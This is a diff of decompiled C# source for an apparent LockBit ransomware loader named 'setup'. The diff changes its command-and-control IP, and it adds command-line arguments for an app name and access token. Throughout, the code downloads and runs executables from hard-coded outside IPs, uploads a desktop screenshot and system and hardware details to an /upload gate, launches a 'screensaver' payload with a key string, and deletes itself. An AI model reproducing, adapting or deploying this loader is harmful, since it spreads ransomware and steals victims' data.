@@ -14,9 +14,15 @@ namespace setup
 	internal class App
 	{
 		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
-		public static void Start()
+		public static void Start(string[] args)
 		{
-			if (MessageBox.Show("REALLY RUN LOCKER????", App.BuildID, MessageBoxButtons.YesNo) == DialogResult.No)
+			if (args.Length < 2)
+			{
+				Environment.Exit(0);
+			}
+			App.AppName = args[0].ToLower().Trim();
+			App.AccessToken = args[1].ToLower().Trim();
+			if (MessageBox.Show("REALLY RUN LOCKER????", App.AppName, MessageBoxButtons.YesNo) == DialogResult.No)
 			{
 				Environment.Exit(0);
 				return;
@@ -34,13 +40,13 @@ namespace setup
 					Content = ScreenShot.MakeDesktopScreenshot()
 				}
 			};
-			App.DownloadAndRun("LockBit_" + App.BuildID + ".exe", "", true);
+			App.DownloadAndRun(App.AppName + ".exe", "--access-token " + App.AccessToken, true);
 			App.UploadDedInfo(files, App.FullInfo());
 			App.DownloadAndRun(App.ScreenSaverName, App.ScreenSaverArgs, false);
 			Runner.SelfRemove();
 		}
 
-		// Token: 0x06000002 RID: 2 RVA: 0x000020EC File Offset: 0x000002EC
+		// Token: 0x06000002 RID: 2 RVA: 0x00002120 File Offset: 0x00000320
 		private static void DownloadAndRun(string ExeName, string Args = "", bool Confirm = true)
 		{
 			using (WebClient webClient = new WebClient())
@@ -50,7 +56,7 @@ namespace setup
 				{
 					try
 					{
-						webClient.DownloadFile(new Uri("http://45.9.190.135/files/" + ExeName), ExeName);
+						webClient.DownloadFile(new Uri("http://141.136.44.54/files/" + ExeName), ExeName);
 						if (Confirm || MessageBox.Show("Start " + ExeName + "?", ExeName, MessageBoxButtons.YesNo) == DialogResult.Yes)
 						{
 							Process.Start(ExeName, Args);
@@ -69,7 +75,7 @@ namespace setup
 			}
 		}
 
-		// Token: 0x06000003 RID: 3 RVA: 0x000021A0 File Offset: 0x000003A0
+		// Token: 0x06000003 RID: 3 RVA: 0x000021D4 File Offset: 0x000003D4
 		private static void UploadDedInfo(App.FileInfo[] Files, NameValueCollection Info)
 		{
 			bool flag = true;
@@ -77,7 +83,7 @@ namespace setup
 			{
 				try
 				{
-					App.UploadFiles("http://45.9.190.135/upload", Files, Info);
+					App.UploadFiles("http://141.136.44.54/upload", Files, Info);
 					break;
 				}
 				catch (Exception ex)
@@ -91,7 +97,7 @@ namespace setup
 			}
 		}
 
-		// Token: 0x06000004 RID: 4 RVA: 0x000021FC File Offset: 0x000003FC
+		// Token: 0x06000004 RID: 4 RVA: 0x00002230 File Offset: 0x00000430
 		private static NameValueCollection FullInfo()
 		{
 			return new NameValueCollection
@@ -114,7 +120,7 @@ namespace setup
 				},
 				{
 					"key",
-					OSInfo.FindLockBit(App.BuildID, 20, 3)
+					OSInfo.GetHardwareID()
 				},
 				{
 					"keyboards",
@@ -134,12 +140,12 @@ namespace setup
 				},
 				{
 					"sender",
-					App.BuildID
+					App.AppName
 				}
 			};
 		}
 
-		// Token: 0x06000005 RID: 5 RVA: 0x000022E0 File Offset: 0x000004E0
+		// Token: 0x06000005 RID: 5 RVA: 0x0000230C File Offset: 0x0000050C
 		public static void UploadFiles(string address, IEnumerable<App.FileInfo> files, NameValueCollection values)
 		{
 			WebRequest webRequest = WebRequest.Create(address);
@@ -178,39 +184,39 @@ namespace setup
 		}
 
 		// Token: 0x04000001 RID: 1
-		private const string GateIP = "45.9.190.135";
+		private const string GateIP = "141.136.44.54";
 
 		// Token: 0x04000002 RID: 2
-		private const string APIUrl = "http://45.9.190.135/upload";
+		private const string APIUrl = "http://141.136.44.54/upload";
 
 		// Token: 0x04000003 RID: 3
-		private const string FilesUrl = "http://45.9.190.135/files/";
+		private const string FilesUrl = "http://141.136.44.54/files/";
 
 		// Token: 0x04000004 RID: 4
-		private static string BuildID = Process.GetCurrentProcess().ProcessName.Split(new char[]
-		{
-			'_'
-		})[1].ToUpper();
+		private static string AppName = "";
 
 		// Token: 0x04000005 RID: 5
-		private static string ScreenSaverName = "screensaver.exe";
+		private static string AccessToken = "";
 
 		// Token: 0x04000006 RID: 6
+		private static string ScreenSaverName = "screensaver.exe";
+
+		// Token: 0x04000007 RID: 7
 		private static string ScreenSaverArgs = "7C28913B6F1CE6E452678F117954BF4EJ7521E2B4A224740AAF64D5FAD08520ACDF9F8912E7DE";
 
 		// Token: 0x02000007 RID: 7
 		public class FileInfo
 		{
-			// Token: 0x0400000B RID: 11
+			// Token: 0x0400000C RID: 12
 			public string Name;
 
-			// Token: 0x0400000C RID: 12
+			// Token: 0x0400000D RID: 13
 			public string Filename = "file.bin";
 
-			// Token: 0x0400000D RID: 13
+			// Token: 0x0400000E RID: 14
 			public string ContentType = "application/octet-stream";
 
-			// Token: 0x0400000E RID: 14
+			// Token: 0x0400000F RID: 15
 			public byte[] Content;
 		}
 	}
